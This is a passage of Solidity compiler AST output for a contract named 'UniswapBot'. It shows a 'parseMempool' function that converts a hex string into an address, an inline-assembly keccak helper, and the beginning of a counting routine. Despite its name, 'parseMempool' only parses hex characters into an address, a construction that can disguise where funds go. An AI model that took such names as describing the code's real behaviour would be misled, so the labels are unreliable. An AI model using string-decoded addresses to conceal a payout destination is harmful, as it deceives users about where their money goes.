																					"src": "9371:2:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 1435,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9377:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "9371:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 1437,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9370:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 1440,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1438,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1328,
																					"src": "9385:2:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 1439,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9391:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "9385:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 1441,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9384:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "9370:24:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 1456,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 1450,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 1448,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1328,
																						"src": "9450:2:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 1449,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9456:2:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9450:8:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 1451,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9449:10:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 1454,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 1452,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1328,
																						"src": "9464:2:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 1453,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9470:2:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9464:8:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 1455,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9463:10:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "9449:24:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 1462,
																	"nodeType": "IfStatement",
																	"src": "9445:73:9",
																	"trueBody": {
																		"id": 1461,
																		"nodeType": "Block",
																		"src": "9475:43:9",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 1459,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 1457,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1328,
																						"src": "9494:2:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 1458,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9500:2:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9494:8:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 1460,
																				"nodeType": "ExpressionStatement",
																				"src": "9494:8:9"
																			}
																		]
																	}
																},
																"id": 1463,
																"nodeType": "IfStatement",
																"src": "9366:152:9",
																"trueBody": {
																	"id": 1447,
																	"nodeType": "Block",
																	"src": "9396:43:9",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 1445,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1443,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1328,
																					"src": "9415:2:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 1444,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9421:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "9415:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 1446,
																			"nodeType": "ExpressionStatement",
																			"src": "9415:8:9"
																		}
																	]
																}
															},
															"id": 1464,
															"nodeType": "IfStatement",
															"src": "9286:232:9",
															"trueBody": {
																"id": 1433,
																"nodeType": "Block",
																"src": "9317:43:9",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1431,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 1429,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1328,
																				"src": "9336:2:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 1430,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9342:2:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "9336:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 1432,
																		"nodeType": "ExpressionStatement",
																		"src": "9336:8:9"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1472,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1465,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1321,
																	"src": "9532:5:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 1470,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 1468,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1466,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1325,
																					"src": "9542:2:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3136",
																					"id": 1467,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9547:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_16_by_1",
																						"typeString": "int_const 16"
																					},
																					"value": "16"
																				},
																				"src": "9542:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1469,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1328,
																				"src": "9552:2:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"src": "9542:12:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		}
																	],
																	"id": 1471,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9541:14:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "9532:23:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 1473,
															"nodeType": "ExpressionStatement",
															"src": "9532:23:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1340,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1334,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1331,
														"src": "8886:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														},
														"id": 1339,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 1335,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8890:1:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															},
															"id": 1338,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 1336,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8894:1:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3230",
																"id": 1337,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8898:2:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_20_by_1",
																	"typeString": "int_const 20"
																},
																"value": "20"
															},
															"src": "8894:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															}
														},
														"src": "8890:10:9",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														}
													},
													"src": "8886:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1475,
												"initializationExpression": {
													"assignments": [
														1331
													],
													"declarations": [
														{
															"constant": false,
															"id": 1331,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 1475,
															"src": "8874:6:9",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 1330,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "8874:4:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 1333,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 1332,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "8883:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "8874:10:9"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1343,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1341,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1331,
															"src": "8902:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 1342,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8907:1:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"src": "8902:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1344,
													"nodeType": "ExpressionStatement",
													"src": "8902:6:9"
												},
												"nodeType": "ForStatement",
												"src": "8869:698:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1478,
															"name": "iaddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1321,
															"src": "9592:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														],
														"id": 1477,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "9584:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
														},
														"typeName": {
															"id": 1476,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9584:7:9",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1479,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9584:14:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"functionReturnParameters": 1312,
												"id": 1480,
												"nodeType": "Return",
												"src": "9577:21:9"
											}
										]
									},
									"documentation": null,
									"id": 1482,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "parseMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1309,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1308,
												"mutability": "mutable",
												"name": "_a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1482,
												"src": "8688:16:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1307,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "8688:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8687:18:9"
									},
									"returnParameters": {
										"id": 1312,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1311,
												"mutability": "mutable",
												"name": "_parsed",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1482,
												"src": "8729:15:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1310,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "8729:7:9",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8728:17:9"
									},
									"scope": 2159,
									"src": "8666:940:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1490,
										"nodeType": "Block",
										"src": "9846:104:9",
										"statements": [
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "9866:77:9",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "9881:51:9",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "9908:4:9"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "9914:2:9",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "9904:3:9"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "9904:13:9"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9898:5:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9898:20:9"
																	},
																	{
																		"arguments": [
																			{
																				"name": "self",
																				"nodeType": "YulIdentifier",
																				"src": "9926:4:9"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9920:5:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9920:11:9"
																	}
																],
																"functionName": {
																	"name": "keccak256",
																	"nodeType": "YulIdentifier",
																	"src": "9888:9:9"
																},
																"nodeType": "YulFunctionCall",
																"src": "9888:44:9"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "9881:3:9"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 1487,
														"isOffset": false,
														"isSlot": false,
														"src": "9881:3:9",
														"valueSize": 1
													},
													{
														"declaration": 1484,
														"isOffset": false,
														"isSlot": false,
														"src": "9908:4:9",
														"valueSize": 1
													},
													{
														"declaration": 1484,
														"isOffset": false,
														"isSlot": false,
														"src": "9926:4:9",
														"valueSize": 1
													}
												],
												"id": 1489,
												"nodeType": "InlineAssembly",
												"src": "9857:86:9"
											}
										]
									},
									"documentation": null,
									"id": 1491,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "keccak",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1485,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1484,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1491,
												"src": "9791:17:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1483,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "9791:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9790:19:9"
									},
									"returnParameters": {
										"id": 1488,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1487,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1491,
												"src": "9833:11:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1486,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "9833:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9832:13:9"
									},
									"scope": 2159,
									"src": "9775:175:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1567,
										"nodeType": "Block",
										"src": "10238:370:9",
										"statements": [
											{
												"assignments": [
													1499
												],
												"declarations": [
													{
														"constant": false,
														"id": 1499,
														"mutability": "mutable",
														"name": "count",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1567,
														"src": "10252:10:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1498,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10252:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1501,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 1500,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10265:1:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10252:14:9"
											},
											{
												"assignments": [
													1503
												],
												"declarations": [
													{
														"constant": false,
														"id": 1503,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1567,
														"src": "10277:6:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1502,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10277:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1505,
												"initialValue": {
													"argumentTypes": null,
													"id": 1504,
													"name": "a",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1493,
													"src": "10286:1:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10277:10:9"
											},
											{
												"body": {
													"id": 1516,
													"nodeType": "Block",
													"src": "10313:56:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1510,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "10328:7:9",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 1509,
																	"name": "count",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1499,
																	"src": "10328:5:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1511,
															"nodeType": "ExpressionStatement",
															"src": "10328:7:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1514,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1512,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1503,
																	"src": "10350:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 1513,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10355:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10350:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1515,
															"nodeType": "ExpressionStatement",
															"src": "10350:7:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1508,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1506,
														"name": "b",
														"nodeType": "Identifier",
